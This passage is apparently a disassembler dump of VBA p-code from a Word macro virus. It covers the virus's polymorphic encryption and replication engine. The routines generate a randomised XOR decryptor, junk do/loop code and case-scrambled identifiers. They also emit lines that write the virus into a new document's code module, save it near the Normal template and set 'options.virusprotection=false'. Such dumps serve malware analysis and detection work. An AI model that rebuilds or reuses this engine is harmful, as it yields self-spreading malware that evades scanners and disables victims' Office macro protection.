' 	St CryptedS 
' Line #90:
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0064 
' 	Add 
' 	St maxlen 
' Line #91:
' 	Ld CrStr 
' 	LitStr 0x0001 "="
' 	Add 
' 	Ld CrStr 
' 	Add 
' 	LitStr 0x0002 "+""
' 	Add 
' 	St c 
' 	BoS 0x0000 
' 	Ld c 
' 	FnLen 
' 	St l 
' Line #92:
' 	EndIfBlock 
' Line #93:
' 	Ld B 
' 	LitStr 0x0001 "+"
' 	Eq 
' 	Ld l 
' 	Ld maxlen 
' 	Ge 
' 	And 
' 	IfBlock 
' Line #94:
' 	Ld CryptedS 
' 	Ld c 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St CryptedS 
' Line #95:
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0064 
' 	Add 
' 	St maxlen 
' Line #96:
' 	Ld CrStr 
' 	LitStr 0x0001 "="
' 	Add 
' 	Ld CrStr 
' 	Add 
' 	St c 
' 	BoS 0x0000 
' 	Ld c 
' 	FnLen 
' 	St l 
' Line #97:
' 	EndIfBlock 
' Line #98:
' 	Ld c 
' 	Ld B 
' 	Add 
' 	St c 
' 	BoS 0x0000 
' 	Ld l 
' 	LitDI2 0x0001 
' 	Add 
' 	St l 
' Line #99:
' 	StartForVariable 
' 	Next 
' Line #100:
' 	Ld CryptedS 
' 	Ld c 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St CryptedS 
' Line #101:
' 	EndSub 
' Line #102:
' 	FuncDefn (Private Sub MakingDecryptor(r11, r21, r23, CrStr, CryptedS, myVars))
' Line #103:
' 	LitDI2 0x0008 
' 	St VarCount 
' Line #104:
' 	OptionBase 
' 	Ld VarCount 
' 	Redim a 0x0001 (As Variant)
' Line #105:
' 	LitStr 0x0001 "("
' 	Ld CrStr 
' 	Add 
' 	St myVars 
' Line #106:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld VarCount 
' 	For 
' Line #107:
' 	Do 
' Line #108:
' 	LitDI2 0x0000 
' 	St a1 
' Line #109:
' 	ArgsLd getname 0x0000 
' 	Ld i 
' 	ArgsSt a 0x0001 
' Line #110:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #111:
' 	Ld i 
' 	ArgsLd a 0x0001 
' 	Ld j 
' 	ArgsLd a 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St a1 
' 	EndIf 
' Line #112:
' 	StartForVariable 
' 	Next 
' Line #113:
' 	Ld a1 
' 	LitDI2 0x0001 
' 	Eq 
' 	LoopWhile 
' Line #114:
' 	Ld myVars 
' 	LitStr 0x0001 ","
' 	Add 
' 	Ld i 
' 	ArgsLd a 0x0001 
' 	Add 
' 	St myVars 
' Line #115:
' 	StartForVariable 
' 	Next 
' Line #116:
' 	Ld myVars 
' 	LitStr 0x0001 ")"
' 	Add 
' 	St myVars 
' Line #117:
' 	Ld StartString 
' 	St s 
' Line #118:
' 	LitDI2 0x0001 
' 	ArgsLd a 0x0001 
' 	LitStr 0x0001 "="
' 	Add 
' 	Ld r11 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c 
' Line #119:
' 	Ld c 
' 	LitDI2 0x0002 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0001 "="
' 	Add 
' 	Ld r21 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c 
' Line #120:
' 	Ld c 
' 	LitDI2 0x0003 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0001 "="
' 	Add 
' 	Ld r23 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c 
' Line #121:
' 	Ld c 
' 	LitDI2 0x0004 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0003 "="""
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c 
' Line #122:
' 	LitStr 0x0005 "mid$("
' 	Ld CrStr 
' 	Add 
' 	LitStr 0x0001 ","
' 	Add 
' 	LitDI2 0x0005 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0003 ",1)"
' 	Add 
' 	St c1 
' Line #123:
' 	LitDI2 0x0001 
' 	ArgsLd a 0x0001 
' 	LitStr 0x0002 "=("
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0001 "+"
' 	Add 
' 	LitDI2 0x0002 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0009 ") mod 255"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c2 
' Line #124:
' 	Ld c2 
' 	LitDI2 0x0002 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0002 "=("
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0001 "+"
' 	Add 
' 	LitDI2 0x0003 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0009 ") mod 255"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c2 
' Line #125:
' 	Ld c2 
' 	LitDI2 0x0003 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0002 "=("
' 	Add 
' 	LitDI2 0x0002 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0001 "+"
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0009 ") mod 255"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c2 
' Line #126:
' 	Ld Rnd 
' 	LitDI2 0x0002 
' 	Mul 
' 	FnInt 
' 	SelectCase 
' Line #127:
' 	LitDI2 0x0000 
' 	CaseEq 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld c2 
' 	LitDI2 0x0006 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0005 "=asc("
' 	Add 
' 	Ld c1 
' 	Add 
' 	LitStr 0x0001 ")"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0006 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0001 "="
' 	Add 
' 	LitDI2 0x0006 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0005 " xor "
' 	Add 
' 	LitDI2 0x0003 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0004 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0001 "="
' 	Add 
' 	LitDI2 0x0004 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0006 "+chr$("
' 	Add 
' 	LitDI2 0x0006 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0001 ")"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c2 
' Line #128:
' 	CaseElse 
' 	BoS 0x0000 
' 	Ld c2 
' 	LitDI2 0x0006 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0005 "=asc("
' 	Add 
' 	Ld c1 
' 	Add 
' 	LitStr 0x0001 ")"
' 	Add 
' 	LitStr 0x0005 " xor "
' 	Add 
' 	LitDI2 0x0003 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0004 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0001 "="
' 	Add 
' 	LitDI2 0x0004 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0006 "+chr$("
' 	Add 
' 	LitDI2 0x0006 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0001 ")"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c2 
' Line #129:
' 	EndSelect 
' Line #130:
' 	Ld Rnd 
' 	LitDI2 0x0006 
' 	Mul 
' 	FnInt 
' 	SelectCase 
' Line #131:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' Line #132:
' 	Ld c 
' 	LitDI2 0x0005 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0002 "=1"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c 
' Line #133:
' 	Ld c 
' 	LitStr 0x000A "_do while "
' 	ArgsLd ref 0x0001 
' 	Add 
' 	LitDI2 0x0005 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0006 "<=len("
' 	Add 
' 	Ld CrStr 
' 	Add 
' 	LitStr 0x0001 ")"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c 
' Line #134:
' 	Ld c 
' 	Ld c2 
' 	Add 
' 	St c 
' Line #135:
' 	Ld c 
' 	LitDI2 0x0005 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0001 "="
' 	Add 
' 	LitDI2 0x0005 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0002 "+1"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c 
' Line #136:
' 	Ld c 
' 	LitStr 0x0005 "_loop"
' 	ArgsLd ref 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c 
' Line #137:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #138:
' 	Ld c 
' 	LitDI2 0x0005 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0002 "=1"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c 
' Line #139:
' 	Ld c 
' 	LitStr 0x000A "_do until "
' 	ArgsLd ref 0x0001 
' 	Add 
' 	LitDI2 0x0005 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0005 ">len("
' 	Add 
' 	Ld CrStr 
' 	Add 
' 	LitStr 0x0001 ")"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c 
' Line #140:
' 	Ld c 
' 	Ld c2 
' 	Add 
' 	St c 
' Line #141:
' 	Ld c 
' 	LitDI2 0x0005 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0001 "="
' 	Add 
' 	LitDI2 0x0005 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0002 "+1"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c 
' Line #142:
' 	Ld c 
' 	LitStr 0x0005 "_loop"
' 	ArgsLd ref 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c 
' Line #143:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #144:
' 	Ld c 
' 	LitDI2 0x0005 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0002 "=1"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c 
' Line #145:
' 	Ld c 
' 	LitStr 0x0003 "_do"
' 	ArgsLd ref 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld c2 
' 	Add 
' 	St c 
' Line #146:
' 	Ld c 
' 	LitDI2 0x0005 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0001 "="
' 	Add 
' 	LitDI2 0x0005 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0002 "+1"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c 
' Line #147:
' 	Ld c 
' 	LitStr 0x000C "_loop while "
' 	ArgsLd ref 0x0001 
' 	Add 
' 	LitDI2 0x0005 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0006 "<=len("
' 	Add 
' 	Ld CrStr 
' 	Add 
' 	LitStr 0x0001 ")"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c 
' Line #148:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' Line #149:
' 	Ld c 
' 	LitDI2 0x0005 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0002 "=1"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c 
' Line #150:
' 	Ld c 
' 	LitStr 0x0003 "_do"
' 	ArgsLd ref 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld c2 
' 	Add 
' 	St c 
' Line #151:
' 	Ld c 
' 	LitDI2 0x0005 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0001 "="
' 	Add 
' 	LitDI2 0x0005 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0002 "+1"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x000C "_loop until "
' 	ArgsLd ref 0x0001 
' 	Add 
' 	LitDI2 0x0005 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0005 ">len("
' 	Add 
' 	Ld CrStr 
' 	Add 
' 	LitStr 0x0001 ")"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c 
' Line #152:
' 	CaseElse 
' Line #153:
' 	Ld c 
' 	LitStr 0x0005 "_for "
' 	ArgsLd ref 0x0001 
' 	Add 
' 	LitDI2 0x0005 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x000A "=1 to len("
' 	ArgsLd ref 0x0001 
' 	Add 
' 	Ld CrStr 
' 	Add 
' 	LitStr 0x0001 ")"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld c2 
' 	Add 
' 	St c 
' Line #154:
' 	Ld c 
' 	LitStr 0x0005 "_next"
' 	ArgsLd ref 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c 
' Line #155:
' 	EndSelect 
' Line #156:
' 	ArgsLd getname 0x0000 
' 	ArgsLd getname 0x0000 
' 	Add 
' 	St Go2 
' Line #157:
' 	Ld c 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c 
' Line #158:
' 	Ld c 
' 	LitStr 0x002F "if Options.ConfirmConversions = true then goto "
' 	ArgsLd ref 0x0001 
' 	Add 
' 	Ld Go2 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c 
' Line #159:
' 	Ld c 
' 	LitStr 0x0021 "Options.ConfirmConversions = True"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c 
' Line #160:
' 	Ld c 
' 	LitStr 0x000D "documents.add"
' 	ArgsLd ref 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c 
' Line #161:
' 	Ld c 
' 	LitStr 0x0043 "activedocument.vbproject.vbcomponents(1).codemodule.insertlines 1, "
' 	ArgsLd ref 0x0001 
' 	Add 
' 	LitDI2 0x0004 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c 
' Line #162:
' 	Ld c 
' 	LitDI2 0x0008 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0017 "=normaltemplate.path+"\"
' 	ArgsLd ref 0x0001 
' 	Add 
' 	LitDI2 0x0007 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x0005 ".doc""
' 	ArgsLd ref 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c 
' Line #163:
' 	Ld c 
' 	LitStr 0x0020 "activedocument.saveas filename:="
' 	ArgsLd ref 0x0001 
' 	Add 
' 	LitDI2 0x0008 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitStr 0x001E ", fileformat:=wdformatdocument"
' 	ArgsLd ref 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c 
' Line #164:
' 	Ld c 
' 	LitStr 0x0014 "activedocument.close"
' 	ArgsLd ref 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c 
' Line #165:
' 	Ld c 
' 	LitStr 0x001D "options.virusprotection=false"
' 	ArgsLd ref 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c 
' Line #166:
' 	Ld c 
' 	LitStr 0x000F "documents.open "
' 	ArgsLd ref 0x0001 
' 	Add 
' 	LitDI2 0x0008 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c 
' Line #167:
' 	Ld c 
' 	LitStr 0x0013 "activedocument.save"
' 	ArgsLd ref 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c 
' Line #168:
' 	Ld c 
' 	LitStr 0x0014 "activedocument.close"
' 	ArgsLd ref 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c 
' Line #169:
' 	Ld c 
' 	LitStr 0x0005 "kill "
' 	Add 
' 	LitDI2 0x0008 
' 	ArgsLd a 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c 
' Line #170:
' 	Ld c 
' 	LitStr 0x0001 "^"
' 	Add 
' 	Ld Go2 
' 	Add 
' 	LitStr 0x0001 ":"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c 
' Line #171:
' 	Ld c 
' 	LitStr 0x0022 "Options.ConfirmConversions = False"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c 
' Line #172:
' 	Ld CryptedS 
' 	Ld c 
' 	Add 
' 	St CryptedS 
' Line #173:
' 	EndSub 
' Line #174:
' 	FuncDefn (Private Function refn(id_FFFE As Variant))
' Line #175:
' 	Ld Rnd 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St refn 
' 	Else 
' 	BoSImplicit 
' 	LitStr 0x0001 ":"
' 	St refn 
' 	EndIf 
' Line #176:
' 	EndFunc 
' Line #177:
' 	FuncDefn (Private Function ref(fff, id_FFFE As Variant))
' Line #178:
' 	LitStr 0x0000 ""
' 	St fff1 
' Line #179:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld fff 
' 	FnLen 
' 	For 
' Line #180:
' 	Ld fff 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	St B 
' Line #181:
' 	Ld Rnd 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Gt 
' 	Ld B 
' 	LitDI2 0x0061 
' 	Ge 
' 	And 
' 	Ld B 
' 	LitDI2 0x007A 
' 	Le 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld B 
' 	LitDI2 0x0020 
' 	Sub 
' 	St B 
' 	EndIf 
' Line #182:
' 	Ld fff1 
' 	Ld B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St fff1 
' Line #183:
' 	StartForVariable 
' 	Next 
' Line #184:
' 	Ld fff1 
' 	St ref 
' Line #185:
' 	EndFunc 
' Line #186:
' 	FuncDefn (Private Sub polym(fc, m))
' Line #187:
' 	Ld Rnd 
' 	LitDI2 0x0007 
' 	Mul 
' 	FnInt 
' 	St t 
' Line #188:
' 	LitDI2 0x0005 
' 	St maxm 
' Line #189:
' 	Ld t 
' 	SelectCase 
' Line #190:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' Line #191:
' 	ArgsLd getname 0x0000 
' 	ArgsLd getname 0x0000 
' 	Add 
' 	St s 
' Line #192:
' 	Ld fc 
' 	Ld s 
' 	Add 
' 	LitStr 0x0001 "="
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	ArgsLd refn 0x0000 
' 	Add 
' 	St fc 
' Line #193:
' 	Ld m 
' 	LitDI2 0x0001 
' 	Add 
' 	St m 
' 	BoS 0x0000 
' 	Ld m 
' 	Ld maxm 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld fc 
' 	Ld m 
' 	ArgsCall (Call) polym 0x0002 
' 	EndIf 
' Line #194:
' 	Ld fc 
' 	LitStr 0x0009 "do while "
' 	ArgsLd ref 0x0001 
' 	Add 
' 	Ld s 
' 	Add 
' 	LitStr 0x0001 "<"
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x000B 
' 	Add 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	ArgsLd refn 0x0000 
' 	Add 
' 	St fc 
' Line #195:
' 	Ld m 
' 	LitDI2 0x0001 
' 	Add 
' 	St m 
' 	BoS 0x0000 
' 	Ld m 
' 	Ld maxm 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld fc 
' 	Ld m 
' 	ArgsCall (Call) polym 0x0002 
' 	EndIf 
' Line #196:
' 	Ld fc 
' 	Ld s 
' 	Add 
' 	LitStr 0x0001 "="
' 	Add 
' 	Ld s 
' 	Add 
' 	LitStr 0x0001 "+"
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	ArgsLd refn 0x0000 
' 	Add 
' 	St fc 
' Line #197:
' 	Ld m 
' 	LitDI2 0x0001 
' 	Add 
' 	St m 
' 	BoS 0x0000 
' 	Ld m 
' 	Ld maxm 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld fc 
' 	Ld m 
' 	ArgsCall (Call) polym 0x0002 
' 	EndIf 
' Line #198:
' 	Ld fc 
' 	LitStr 0x0004 "loop"
' 	ArgsLd ref 0x0001 
' 	Add 
' 	ArgsLd refn 0x0000 
' 	Add 
' 	St fc 
' Line #199:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #200:
' 	ArgsLd getname 0x0000 
' 	ArgsLd getname 0x0000 
' 	Add 
' 	St s 
' Line #201:
' 	Ld fc 
' 	Ld s 
' 	Add 
' 	LitStr 0x0001 "="
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	ArgsLd refn 0x0000 
' 	Add 
' 	St fc 
' Line #202:
' 	Ld m 
' 	LitDI2 0x0001 
' 	Add 
' 	St m 
' 	BoS 0x0000 
' 	Ld m 
' 	Ld maxm 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld fc 
' 	Ld m 
' 	ArgsCall (Call) polym 0x0002 
' 	EndIf 
' Line #203:
' 	Ld fc 
' 	LitStr 0x0009 "do until "
' 	ArgsLd ref 0x0001 
' 	Add 
' 	Ld s 
' 	Add 
' 	LitStr 0x0001 ">"
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x000B 
' 	Add 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	ArgsLd refn 0x0000 
' 	Add 
' 	St fc 
' Line #204:
' 	Ld m 
' 	LitDI2 0x0001 
' 	Add 
' 	St m 
' 	BoS 0x0000 
' 	Ld m 
' 	Ld maxm 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld fc 
' 	Ld m 
' 	ArgsCall (Call) polym 0x0002 
' 	EndIf 
' Line #205:
' 	Ld fc 
' 	Ld s 
' 	Add 
' 	LitStr 0x0001 "="
' 	Add 
' 	Ld s 
' 	Add 
' 	LitStr 0x0001 "+"
